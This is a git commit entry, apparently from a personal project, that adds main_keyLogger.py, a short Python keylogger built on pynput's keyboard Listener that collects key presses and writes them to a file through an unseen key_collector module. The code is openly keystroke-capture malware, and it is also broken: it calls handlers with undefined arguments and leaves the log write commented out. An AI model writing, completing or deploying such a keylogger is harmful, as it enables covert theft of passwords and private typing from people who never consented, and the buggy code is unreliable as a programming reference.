d3602407f241e039ee7a00ab2bbce78eebba5bfa
effi_fertig <fefertig@icloud.com>
2025-06-20 12:46:01 +0300

    made some upgrades i think

---
+++ main_keyLogger.py
@@ -0,0 +1,13 @@
+from key_collector import *
+from pynput.keyboard import Listener
+
+def KeyLogger(listener):
+    pressed= []
+    logs = {}
+    on_press(listener)
+    write_file(pressed)
+    # with open('logger.txt', 'a') as f:
+        # f.write(logs)
+    on_release(listener)
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
